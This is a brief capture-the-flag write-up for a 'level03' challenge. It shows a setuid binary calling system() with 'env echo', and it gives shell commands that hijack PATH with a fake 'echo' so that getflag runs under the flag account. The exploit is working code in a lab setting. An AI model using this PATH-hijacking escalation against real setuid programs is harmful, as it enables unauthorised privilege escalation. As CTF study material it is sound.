if you decompile the file `level03` you find out that somewhere at the end they call

```C
system("/usr/bin/env echo Exploit me")
```

also with `ls -lA` you can see the uid of the file is flag03

if you now do

```Shell
cd /tmp
echo "$(which getflag)" > echo
chmod +x ./echo
cd
PATH=/tmp ./level03
```

you will see that getflag gets executed and the next token is outputed
